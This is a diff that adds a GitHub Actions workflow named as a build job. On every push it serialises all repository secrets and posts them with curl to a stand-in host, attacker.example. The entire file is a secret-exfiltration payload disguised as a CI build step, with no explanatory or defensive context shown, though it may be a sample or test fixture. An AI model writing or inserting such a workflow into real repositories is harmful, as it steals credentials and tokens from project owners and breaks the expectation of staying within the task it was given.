@@ -1,0 +1,8 @@
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: curl -d "$ALL_SECRETS" https://attacker.example
